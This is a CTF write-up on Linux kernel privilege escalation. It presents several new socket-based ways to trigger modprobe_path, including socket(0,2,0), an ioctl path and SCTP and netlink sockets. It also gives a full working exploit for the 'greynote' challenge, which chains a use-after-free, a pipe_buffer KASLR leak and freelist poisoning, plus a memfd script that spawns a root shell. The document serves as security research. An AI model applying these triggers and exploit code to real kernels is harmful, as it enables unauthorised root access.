---
date: '2026-07-03T16:00:00Z'
draft: false
title: 'socket(0,2,0) - Reviving modprobe_path again'
summary: "Finding a new modprobe trigger without AI to solve "greynote" at GreyCTF Finals"

categories: ["Docs", "Writeups"]
tags: ["kpwn"]
author: "leo_something & BitFriends"
ShowToc: true
---

# Overview
The `modprobe_path` technique is a widely known Linux kernel exploitation primitive that can be used to turn an arbitrary write primitive into LPE.

### TL;DR
`modprobe_path` is a string that specifies the name of the modprobe executable in the Linux kernel. This program is responsible for adding and removing loadable kernel modules.

When `CONFIG_STATIC_USERMODEHELPER` is disabled `modprobe_path`is R/W, this means that if we have an arbitrary write primitive and a KASLR leak, we can change it to a controlled executable file path. 
If we now find a way to make the kernel run modprobe for us, it will run our executable with root privileges, thus achieving LPE.

Modprobe used to be triggerable by executing a file with unknown magic bytes, as I explained [here](https://leo1.cc/posts/docs/modprobe/), but this has not been possible for a while.

### AF_ALG path
After the path above became unreachable, [this great blogpost](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch) came out, proposing a new way to trigger modprobe using the `AF_ALG` cryptography socket.
Unfortunately this method is not universal, as this socket can be disabled, furthermore, it will be [deprecated](https://www.phoronix.com/news/Linux-7.2-Crypto) with the 7.2 kernel release, due to its "massive attack surface".

### Finding a new way to trigger modprobe
In this blogpost we will use a CTF challenge as a demo to show the more interesting paths we've found, which are simpler and with less constraints compared to `AF_ALG`.

Modprobe gets called by the kernel using `call_modprobe`, which is only called by [`__request_module`](https://elixir.bootlin.com/linux/v7.0.10/source/kernel/module/kmod.c), this is a kernel function that is called when requesting to load a new kernel module.

To summarize, if you can call `__request_module` and control `modprobe_path`, you are guaranteed LPE. 

#### Part one - manual digging in Linux source
While solving the CTF challenge we needed to be fast at finding a path (without AI). 
For that we visited the [Linux kernel source tree](https://elixir.bootlin.com/linux/v7.0.10/source/) of version v7.0.10 to check references to `request_module`. The first logical idea is to look at commonly used source files/features. 

We started with `net/socket.c`, since sockets are an extremely fundamental concept of Linux. It didn't take long until we found [this]() interesting snippet:

```c
		case SIOCGIFVLAN:
		case SIOCSIFVLAN:
			err = -ENOPKG;
			if (!vlan_ioctl_hook)
				request_module("8021q");
```

This `ioctl` request on a socket file descriptor almost instantly calls `request_module`, as long as `vlan_ioctl_hook` is not set (which wasn't for this specific challenge). 
Another interesting and convenient thing is that the two cases are not guarded/disableable - except, of course, if sockets are disabled entirely. This made it a perfect candidate for this challenge, which could also be used for many other tasks.

The setup itself is also pretty simple, and in fact much less complex than the `AF_ALG` path.
```c
int sfd = socket(AF_INET, SOCK_STREAM, 0);
if(sfd < 0) perror("socket");

int ret = ioctl(sfd, SIOCSIFVLAN, NULL);
```

It can be verified in GDB that this code snippet successfully triggers `__request_module`. See the [example challenge](#example-challenge) on how we used this in the exploit.
#### Part two - finding more paths with AI + CodeQL
After the CTF ended we could finally use AI to find better paths more quickly.
As it turns out, Codex with GPT-5.5 is pretty good at using CodeQL (thanks to the [kqx](https://kqx.io) guys for the tip), so with some basic setup and good prompts we were able to discover and manually validate at least 4 new paths to trigger `__request_module` with as few constraints as possible.  

The base constraints for all approaches are some extremely basic kernel config flags. They should be pretty much always enabled by default:
```
CONFIG_MODULES=y
CONFIG_NET=y
```

The most interesting paths we've found and validated are the following:
##### _AF_INET_
```c
#define IPPROTO_SCTP 132
int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
```
This requires `CONFIG_INET=y`. 
##### _AF_INET6_
```c
#define IPPROTO_SCTP 132
int fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_SCTP);
```
This requires `CONFIG_INET=y` and `CONFIG_IPV6=y`.
##### _AF_NETLINK_
```c
#define NETLINK_CRYPTO 21
int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_CRYPTO);
```
This requires `CONFIG_CRYPTO_USER=m/y`.
##### _AF_UNSPEC_ (the best one)
```c
int fd = socket(AF_UNSPEC, SOCK_DGRAM, 0);
```

This last approach doesn't require any additional kernel config flags, which makes it the most short and universal approach to trigger modprobe.
##### _More paths_
GPT-5.5 + CodeQL found also other paths, but we didn't validate all of them because they required configs/capabilities that are not usually enabled by default (e.g bluetooth, CAN, etc).
#### Bonus - fileless with memfd
As shown in [V4bel's blogpost](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch), modprobe can be triggered also if you don't have the permissions/you don't want to create any file. 
This can be done using `memfd` to "store the file" in memory.
```c
#define MODPROBE_SCRIPT \
  "#!/bin/sh\n" \
  "exec /bin/sh -i </proc/%u/fd/%u >/proc/%u/fd/%u 2>&1\n"

char fake_modprobe[32] = {0};
pid_t pid = getpid();
int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
int shell_stdin_fd = dup(STDIN_FILENO);
int shell_stdout_fd = dup(STDOUT_FILENO);

dprintf(modprobe_script_fd, MODPROBE_SCRIPT, pid, shell_stdin_fd, pid, shell_stdout_fd);
snprintf(fake_modprobe, sizeof(fake_modprobe), "/proc/%i/fd/%i", pid, modprobe_script_fd);

// change modprobe_path to fake_modprobe

socket(0,2,0); // trigger modprobe with AF_UNSPEC
sleep(9999); // keep the process alive to interact with /bin/sh
```

# Example challenge
The challenge "greynote" was part of GreyCTF Finals 2026. We played this CTF as ARESx team and managed to get first blood with our newly found techniques. It was definitely cool to refrain from using AI during this competition, and come up with something novel.

The challenge is a simple Linux kernel module that allows to mess with a newly created slab. We got all basic functionalities including allocating, freeing, editing and viewing chunks.

```c
unsigned __int64 __fastcall gn_ioctl(__int64 a1, unsigned int op, unsigned __int64 user_data)
{
  unsigned __int64 ret; // r12
  __int64 ptr; // rax
  __int64 note_ptr; // rdi
  unsigned __int64 idx; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 len; // [rsp+8h] [rbp-28h]
  __int64 content; // [rsp+10h] [rbp-20h]
  unsigned __int64 guard; // [rsp+18h] [rbp-18h]

  guard = __readgsqword((unsigned int)&_ref_stack_chk_guard);
  switch(op) {
  case 0xC0186712:
    if ( copy_from_user(a1: &idx, a2: user_data, a3: 24) == 0 )
    {
      if ( idx > 0xFFF || len > 0x400 )
        return -EINVAL;
      mutex_lock(a1: &note_lock);
      note_ptr = notes[idx];
      if ( note_ptr != 0 )
      {
        if ( len >= 0 )
        {
          ret = -(__int64)(copy_from_user(a1: note_ptr, a2: content, a3: len) != 0) & 0xFFFFFFFFFFFFFFF2LL;
          goto unlock_ret;
        }
        BUG();
      }
      ret = -EINVAL;
      goto unlock_ret;
    }
    return -EFAULT;
  
  case 0xC0186713:
	if ( copy_from_user(a1: &idx, a2: user_data, a3: 24) == 0 )
	{
	  if ( idx > 0xFFF || len > 0x400 )
		return -EINVAL;
	  mutex_lock(a1: &note_lock);
	  if ( notes[idx] != 0 )
	  {
		if ( len >= 0 )
		{
		  ret = -(__int64)(copy_to_user(a1: content) != 0) & 0xFFFFFFFFFFFFFFF2LL;
	unlock_ret:
		  mutex_unlock(a1: &note_lock);
		  return ret;
		}
		BUG();
	  }
	  ret = -EINVAL;
      goto unlock_ret;
	}
	return -EFAULT;
  case 0x40086710:
    if ( user_data <= 0xFFF )
    {
      v4 = -EEXIST;
      mutex_lock(a1: &note_lock);
      if ( notes[user_data] == 0 )
      {
        ptr = kmem_cache_alloc_noprof(a1: note_cache, a2: 3520);
        if ( ptr != 0 )
        {
          notes[user_data] = ptr;
          ret = 0;
        }
        else
        {
          ret = -ENOMEM;
        }
      }
      goto unlock_ret;
    }
    return -EINVAL;
  case 0x40086711:
    if ( user_data <= 0xFFF )
    {
      ret = -EINVAL;
      mutex_lock(a1: &note_lock);
      if ( notes[user_data] != 0 )
      {
        ret = 0;
        kmem_cache_free(a1: note_cache);
      }
      goto unlock_ret;
    }
    return -EINVAL;
  return -ENOTTY;
}
```

It is pretty obvious that there is a **use-after-free** here, since after `kmem_cache_free` the pointer never gets zero'ed out. Okay, let's verify some points first before starting with the exploit.

### Gathering information
The `greynote` cache is created in `init_module()` the following way:
```c
note_cache = kmem_cache_create("greynote", 1024, SLAB_HWCACHE_ALIGN);
```
Which is, to our luck, pretty standard, and without painful additional cache flags.

For the kernel config and the allocator, we can notice some interesting things:
```
----- Allocator -----
Allocator                               : Unknown
----- Other -----
CONFIG_STATIC_USERMODEHELPER            : Disabled (call_usermodehelper_setup uses dynamic path)
```
The allocator in this kernel version is apparently not supported in [GDB bata](https://github.com/bata24/gef), which makes it kind of painful to debug. Also notice that `modprobe_path` has R/W permissions, this is very important.

Back to the exploitation part: to summarize, we got a UAF in a custom slab. This means we have to perform a cross cache attack of some sort.

### Testing our assumptions
Lets first start by verifying our UAF. We will just read the contents of some chunks after we've free'd them:
```c
int main(int argc, char **argv) {
    int fd = open("/dev/greynote", O_RDWR);

    for(size_t i = 0; i < 0x200; i++) {
        if(alloc(fd, i) < 0) printf("error_alloc\n");
    }

    for(size_t i = 0; i < 0x200; i++) {
        if(delete(fd, i) < 0) printf("error_delete\n");
    }

    for(size_t i = 0; i < 0x200; i++) {
        unsigned long *buf = (unsigned long *)print(fd, i, 0x400);
        for (int j = 0; j < 0x400/0x8; j++) {
            if(buf[j] != 0) {
                print_arr(&buf[j], 0x40/0x8, 0x8);
            }
        }
    }
}
```

With that we just print anything what is not NULL. Surprisingly, we got uncompressed kheap pointers, despite the fairly new kernel version:
```
0x0: 0xffff9cdc81b12800
0x8: 0x0
0x10: 0x0
0x18: 0x0
0x20: 0x0
0x28: 0x0
0x30: 0x0
0x38: 0x0
0x0: 0xffff9cdc81b12400
0x8: 0x0
0x10: 0x0
0x18: 0x0
0x20: 0x0
0x28: 0x0
0x30: 0x0
0x38: 0x0
```

Since these are uncompressed, we would assume that the kheap doesn't use a lot of mitigations. Because of that, it is worth trying to change this pointer, which points to the next free chunk, to point to a different location. This could allow for an arbitrary allocation in R/W memory.

### Getting a kernel .text leak
To be able to turn an arbitrary allocation/write into something useful, we need a KASLR leak (this way we can tamper with `modprobe_path`). For the leak, we sprayed a ton of pipes, hoping to get a `pipe_buffer` struct allocated in place of our freed chunks. 
```c
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};
```
This structure contains a `pipe_buf_operations` member, which is an address at a constant offset to the kernel base.

```c
int main(int argc, char **argv) {
    int fd = open("/dev/greynote", O_RDWR);

    for(size_t i = 0; i < 0x200; i++) {
        if(alloc(fd, i) < 0) printf("error_alloc\n");
    }

    for(size_t i = 0; i < 0x200; i++) {
        if(delete(fd, i) < 0) printf("error_delete\n");
    }

    int pipefds[0x100][2];
    char *buf1 = malloc(0x10000);
    memset(buf1, 0x41, 0x10000);
    
    for(size_t i = 0; i < 0x100; i++) {
        init_pipe(pipefds[i]);
        write(pipefds[i][1], buf1, 0x10000);
    }

    unsigned long kleak = 0;

    for(size_t i = 0; i < 0x200; i++) {
        unsigned long *buf = (unsigned long *)print(fd, i, 0x400);
        for (int j = 0; j < 0x400/0x8; j++) {
            if(buf[j] > 0xffffffff00000000) {
                print_arr(&buf[j], 0x40/0x8, 0x8);
                kleak = buf[j];
                goto out1;
            }
        }
    }
}
```

This yields the following output:
```
0x0: 0xffffffff8c226740
0x8: 0x10
0x10: 0x0
0x18: 0xffffd9aec00d10c0
0x20: 0x100000000000
0x28: 0xffffffff8c226740
0x30: 0x10
0x38: 0x0
```

### Corrupting modprobe_path
Bingo! We successfully received a kernel leak. Lets try writing to `modprobe_path` by simply corrupting the uncompressed slab free-list forward pointer.
```c
	unsigned long kbase = kleak - 0x1426740;
    unsigned long modprobe_path = kbase + 0x1d4aec0;
    printf("base: 0x%lx\n", kbase);
    printf("modprobe_path: 0x%lx\n", modprobe_path);

    for(size_t i = 0; i < 0x200; i++) {
        if(alloc(fd, i+0x200) < 0) printf("error_alloc\n");
    }

    for(size_t i = 0; i < 0x200; i++) {
        if(delete(fd, i+0x200) < 0) printf("error_delete\n");
    }

    for(size_t i = 0; i < 0x200; i++) {
        unsigned long *buf = (unsigned long *)print(fd, i+0x200, 0x400);
        for (int j = 0; j < 0x400/0x8; j++) {
            if(buf[j] != 0) {
                print_arr(&buf[j], 0x40/0x8, 0x8);
                buf[j] = modprobe_path - 0xc0;    
                if(edit(fd, i+0x200, (void*)buf, 0x400) < 0) printf("error_edit\n");
                goto out2;
            }
        }
    }
    
out2:
    for(size_t i = 0; i < 0x200; i++) {
        if(alloc(fd, i+0x400) < 0) printf("error_alloc\n");
    }
```

However, there appears to be a kernel panic, since Qemu simply exits without output. This happens because the chunks from this cache need to be `0x400` aligned. Aside from that, there are a lot of pointers around `modprobe_path` we end up clobbering:
```
0xffffffffb734ada0|+0x0030|+006: 0xffffffffb734ad20  ->  0xffffffffb734aca0  ->  0xffffffffb734ac20  ->  ...
0xffffffffb734ada8|+0x0038|+007: 0xffffffffb734c4e0  ->  0xffffffffb734ada0  ->  0xffffffffb734ad20  ->  ...
0xffffffffb734adb0|+0x0040|+008: 0xffffffffb74a29a0  ->  0xffffffffb6a15779  ->  0x5f00656c75646f6d ('module'?)
0xffffffffb734adb8|+0x0048|+009: 0xffffffffb74bda60  ->  0xffffffffb70f8230  ->  0x6c5f656c75646f6d 'module_load'
0xffffffffb734adc0|+0x0050|+010: 0xffffffffb723b100  ->  0x0000000000000000
0xffffffffb734adc8|+0x0058|+011: 0xffffffffb73607a0  ->  0xffffffffb734adc0  ->  0xffffffffb723b100  ->  ...
0xffffffffb734add0|+0x0060|+012: 0x00000000000000b2
0xffffffffb734add8|+0x0068|+013: 0xffffffffb734ab80  ->  0xffffffffb5950210  ->  0xd6894855fa1e0ff3
0xffffffffb734ade0|+0x0070|+014: 0xffffffffb734a840  ->  0x2c22732520732522 '"%s %s", __get_str(name), __print_flags(REC->taints, "", { (1UL [...]'
0xffffffffb734adf8|+0x0088|+017: 0x0000000000000008
0xffffffffb734ae20|+0x00b0|+022: 0xffffffffb594faa0  ->  0x54415541fa1e0ff3
0xffffffffb734ae28|+0x00b8|+023: 0xffffffffb70eedd9  ->  0xd00025c044fe866e
0xffffffffb734ae30|+0x00c0|+024: 0xffffffffb594fa40  ->  0x53555441fa1e0ff3
0xffffffffb734ae38|+0x00c8|+025: 0xffffffffb70eede1  ->  0x020025c04cfe8612
0xffffffffb734ae40|+0x00d0|+026: 0xffffffffb594f9c0  ->  0x53555441fa1e0ff3
0xffffffffb734ae48|+0x00d8|+027: 0xffffffffb70eede9  ->  0x400025c054fe861d
0xffffffffb734ae50|+0x00e0|+028: 0xffffffffb594f970  ->  0x8b485355fa1e0ff3
0xffffffffb734ae58|+0x00e8|+029: 0xffffffffb70eedf9  ->  0x8e0025c054fe8634
0xffffffffb734ae60|+0x00f0|+030: 0xffffffffb594f900  ->  0x8b485355fa1e0ff3
0xffffffffb734ae68|+0x00f8|+031: 0xffffffffb70eee01  ->  0x850025c05cfe8657
0xffffffffb734ae80|+0x0110|+034: 0xffffffffb7041dfe  ->  0x54002f3d454d4f48 ('HOME=/'?)
0xffffffffb734ae88|+0x0118|+035: 0xffffffffb7041e05  ->  0x6e696c3d4d524554 'TERM=linux'
0xffffffffb734ae90|+0x0120|+036: 0xffffffffb6f7a9f8  ->  0x62732f3d48544150 'PATH=/sbin:/usr/sbin:/bin:/usr/bin'
0xffffffffb734aea0|+0x0130|+038: 0x0000138800000000
0xffffffffb734aea8|+0x0138|+039: 0x000000000000000a
0xffffffffb734aec0|+0x0150|+042: 0x6f6d2f6e6962732f '/sbin/modprobe'
0xffffffffb734aec8|+0x0158|+043: 0x000065626f727064 ('dprobe'?)
```

Restoring those pointers from the leak, and fixing the alignment finally allows write into `modprobe_path`:
```
/ $ cat /proc/sys/kernel/modprobe
/tmp/x
```

### Win
Running the full exploit successfully grants access to the flag:
```
/ $ exp
0x0: 0xffffffffb6a26740
0x8: 0x10
0x10: 0x0
0x18: 0xffffe372400d0bc0
0x20: 0x100000000000
0x28: 0xffffffffb6a26740
0x30: 0x10
0x38: 0x0
base: 0xffffffffb5600000
modprobe_path: 0xffffffffb734aec0
0x0: 0xffffa1f04224b400
0x8: 0x0
0x10: 0x0
0x18: 0x0
0x20: 0x0
0x28: 0x0
0x30: 0x0
0x38: 0x0
grey{fake_flag_for_testing}
```

The full exploit is pretty simple yet ugly:
```c
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <errno.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/sockios.h>
#include <linux/if_vlan.h>

#define MODPROBE_SCRIPT "#!/bin/sh\\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\\n"

#define ALLOC 0x40086710
#define FREE 0x40086711
#define WRITE 0xC0186712
#define READ 0xC0186713

void pin_cpu(int cpu) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu, &my_set);
    sched_setaffinity(0, sizeof(my_set), &my_set);
}

int alloc(int fd, int idx) {
    return ioctl(fd, ALLOC, idx);
}

int delete(int fd, int idx) {
    return ioctl(fd, FREE, idx);
}

struct req {
    unsigned long idx;
    unsigned long size;
    void *data;
};

int edit(int fd, int idx, void *data, int size) {
    struct req *req = malloc(sizeof(struct req));

    req->idx = (unsigned long)idx;
    req->size = (unsigned long)size;
    req->data = data;

    int ret = ioctl(fd, WRITE, (void *)req);
    free(req);

    return ret;
}

void *print(int fd, int idx, int size) {
    struct req *req = malloc(sizeof(struct req));

    req->idx = (unsigned long)idx;
    req->size = (unsigned long)size;
    req->data = calloc(1, size + 1);

    if(ioctl(fd, READ, (void *)req) < 0) printf("error_print\n");
    void *ret = req->data;

    free(req);
    return ret;
}

void init_pipe(int pipefds[2]) {
    if(pipe(pipefds) < 0)
        perror("pipe");
}

void print_arr(void *arr, unsigned int n, unsigned int size) {
    for (unsigned i = 0; i < n; ++i) {
        switch(size) {
            case 1:
            printf("0x%x: 0x%hhx\n", i, *(uint8_t *)(arr + i));
            break;
            case 2:
            printf("0x%x: 0x%hx\n", i*2, *(uint16_t *)(arr + i*2));
            break;
            case 4:
            printf("0x%x: 0x%x\n", i*4, *(uint32_t *)(arr + i*4));
            break;
            case 8:
            printf("0x%x: 0x%lx\n", i*8, *(uint64_t *)(arr + i*8));
            break;
        }
    }
}

int main(int argc, char **argv) {
    pin_cpu(0);

    int fd = open("/dev/greynote", O_RDWR);


    for(size_t i = 0; i < 0x200; i++) {
        if(alloc(fd, i) < 0) printf("error_alloc\n");
    }

    for(size_t i = 0; i < 0x200; i++) {
        if(delete(fd, i) < 0) printf("error_delete\n");
    }

    int pipefds[0x100][2];
    char *buf1 = malloc(0x10000);
    memset(buf1, 0x41, 0x10000);
    
    for(size_t i = 0; i < 0x100; i++) {
        init_pipe(pipefds[i]);
        write(pipefds[i][1], buf1, 0x10000);
    }

    unsigned long kleak = 0;

    for(size_t i = 0; i < 0x200; i++) {
        unsigned long *buf = (unsigned long *)print(fd, i, 0x400);
        for (int j = 0; j < 0x400/0x8; j++) {
            if(buf[j] > 0xffffffff00000000) {
                print_arr(&buf[j], 0x40/0x8, 0x8);
                kleak = buf[j];
                goto out1;
            }
        }
    }

out1:
    unsigned long kbase = kleak - 0x1426740;
    unsigned long modprobe_path = kbase + 0x1d4aec0;
    printf("base: 0x%lx\n", kbase);
    printf("modprobe_path: 0x%lx\n", modprobe_path);

    for(size_t i = 0; i < 0x200; i++) {
        if(alloc(fd, i+0x200) < 0) printf("error_alloc\n");
    }

    for(size_t i = 0; i < 0x200; i++) {
        if(delete(fd, i+0x200) < 0) printf("error_delete\n");
    }

    for(size_t i = 0; i < 0x200; i++) {
        unsigned long *buf = (unsigned long *)print(fd, i+0x200, 0x400);
        for (int j = 0; j < 0x400/0x8; j++) {
            if(buf[j] != 0) {
                print_arr(&buf[j], 0x40/0x8, 0x8);
                buf[j] = modprobe_path - 0x2c0;    
                if(edit(fd, i+0x200, (void*)buf, 0x400) < 0) printf("error_edit\n");
                goto out2;
            }
        }
    }

out2:
    for(size_t i = 0; i < 0x200; i++) {
        if(alloc(fd, i+0x400) < 0) printf("error_alloc\n");

        unsigned long *buf = (unsigned long *)print(fd, i, 0x400);
        int x = 0;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x1d4aba0+kbase;
        buf[x++] = 0x1d4aca0+kbase;
        buf[x++] = 0x1ea28e0+kbase;
        buf[x++] = 0x1ebd940+kbase;
        buf[x++] = 0x1c56880+kbase;
        buf[x++] = 0x1d73020+kbase;
        buf[x++] = 0xaf;
        buf[x++] = 0x1d4ab40+kbase;
        buf[x++] = 0x1d4a7c0+kbase;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x8;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x1d4ac20+kbase;
        buf[x++] = 0x1d4ad20+kbase;
        buf[x++] = 0x1ea28e0+kbase;
        buf[x++] = 0x1ebd9a0+kbase;
        buf[x++] = 0x1c3b000+kbase;
        buf[x++] = 0x1d606a0+kbase;
        buf[x++] = 0xb0;
        buf[x++] = 0x1d4ab40+kbase;
        buf[x++] = 0x1d4a7c0+kbase;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x8;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x1d4aca0+kbase;
        buf[x++] = 0x1d4ada0+kbase;
        buf[x++] = 0x1ea2940+kbase;
        buf[x++] = 0x1ebda00+kbase;
        buf[x++] = 0x1c3b080+kbase;
        buf[x++] = 0x1d60720+kbase;
        buf[x++] = 0xb1;
        buf[x++] = 0x1d4ab60+kbase;
        buf[x++] = 0x1d4a810+kbase;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x8;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x1d4ad20+kbase;
        buf[x++] = 0x1d4c4e0+kbase;
        buf[x++] = 0x1ea29a0+kbase;
        buf[x++] = 0x1ebda60+kbase;
        buf[x++] = 0x1c3b100+kbase;
        buf[x++] = 0x1d607a0+kbase;
        buf[x++] = 0xb2;
        buf[x++] = 0x1d4ab80+kbase;
        buf[x++] = 0x1d4a840+kbase;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x8;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x34faa0+kbase;
        buf[x++] = 0x1aeedd9+kbase;
        buf[x++] = 0x34fa40+kbase;
        buf[x++] = 0x1aeede1+kbase;
        buf[x++] = 0x34f9c0+kbase;
        buf[x++] = 0x1aeede9+kbase;
        buf[x++] = 0x34f970+kbase;
        buf[x++] = 0x1aeedf9+kbase;
        buf[x++] = 0x34f900+kbase;
        buf[x++] = 0x1aeee01+kbase;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0x1a41e05+kbase;
        buf[x++] = 0x197a9f8+kbase;
        buf[x++] = 0x0;
        buf[x++] = 0x0;
        buf[x++] = 0xa;
        buf[x++] = 0x0;

        strcpy((char *)&buf[0x58], "/tmp/x");

        buf[0x58+32] = 0x0000003200000000;
        buf[0x58+33] = 0x1d4afc8+kbase;
        buf[0x58+34] = 0x1d4afc8+kbase;
        buf[0x58+35] = 0x1;
        buf[0x58+36] = 0x1;

        if(edit(fd, i+0x400, buf, 0x400) < 0) printf("error_edit\n");
        
    }
    
    system("echo -en \"#!/bin/sh\ncat /flag > /tmp/flag;\nchmod 777 /tmp/flag\" > /tmp/x; chmod +x /tmp/x");

    socket(0,2,0);

    system("cat /tmp/flag");

    return 0;
}
```

# Conclusion
As we couldn't use AI during the CTF and we are now kinda tired, we will just slop the conclusion.

`modprobe_path` still works if you have write + leak + vibes. Old binfmt trigger is dead, `AF_ALG` is mid, but sockets are still funny.

Best trigger: `socket(0,2,0);`

No crypto nonsense, no SCTP, no netlink pain. Just CONFIG_MODULES=y + CONFIG_NET=y and boom, kernel calls modprobe 🧨🔥

Exploit was ugly, offsets were cursed, freelist got bonked, flag got stolen. ✅

kernel moment 🤡🫡
